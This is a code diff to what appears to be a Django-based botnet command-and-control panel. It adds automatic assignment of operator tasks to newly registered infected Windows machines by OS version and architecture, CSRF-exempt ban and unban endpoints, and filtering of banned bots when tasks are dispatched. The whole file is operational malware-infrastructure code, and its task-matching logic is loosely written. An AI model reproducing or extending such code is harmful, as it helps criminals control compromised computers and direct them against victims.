@@ -311,6 +311,26 @@ class Handlers:
                 elif os_major == 5 and os_minor == 1:
                     _bot.is_winxp = True
 
+                if is_x64:
+                    xoc = 'x64'
+                else:
+                    xoc = 'x32'
+
+                _bot.save()
+
+                if _bot.is_winxp:
+                    task_win = 'winxp'
+                elif _bot.is_win7:
+                    task_win = 'win7'
+                elif _bot.is_win10:
+                    task_win = 'win10'
+
+                tasks = [task for task in Task.objects.all() if (task.xoc == xoc or
+                task.xoc == 'x32_64') or (task.winos == 'all_win' or task.winos == task_win)]
+
+                for task in tasks:
+                    _bot.tasks.add(task)
+
                 _bot.save()
 
                 res = PanelMsg.RegistrationResult()
@@ -370,11 +390,20 @@ class Handlers:
         return HttpResponse('200')
 
     @staticmethod
-    def ban(request) -> HttpResponse:
-        bot = Bot.objects.get(uid=request.GET['uid'])
+    @csrf_exempt
+    def ban(request) -> JsonResponse:
+        bot = Bot.objects.get(uid=request.POST['uid'])
         bot.is_banned = True
         bot.save()
-        return HttpResponse('200')
+        return JsonResponse({'v': '200'})
+
+    @staticmethod
+    @csrf_exempt
+    def unban(request) -> JsonResponse:
+        bot = Bot.objects.get(uid=request.POST['uid'])
+        bot.is_banned = False
+        bot.save()
+        return JsonResponse({'v': '200'})
 
     @csrf_exempt
     def create_task(self, request):
@@ -398,7 +427,14 @@ class Handlers:
         }
 
         bots = [s[win] for win in wins if len(s[win]) != 0]
-        _bots = [bot for bot in bots[0] if ('x32' if bot.is_x64 is False else 'x64') in x_oc]
+
+        if 'x32_64' in x_oc:
+            _bots = [bot for bot in bots[0] if bot.is_banned is False]
+        else:
+            _bots = [bot for bot in bots[0] if ('x32' if bot.is_x64 is False else 'x64') in x_oc and bot.is_banned
+                     is False]
+
+        print(_bots)
 
         task = Task(name=name, country=country, type1=_type, winos=':'.join(wins), xoc=':'.join(x_oc),
                     repetitions=data['reps'],
@@ -410,4 +446,6 @@ class Handlers:
 
         return HttpResponse('200')
 
-# ОБРАБОТЧИКИ -------------------------------------------- /\
+
+
+# ОБРАБОТЧИКИ -------------------------------------------- /
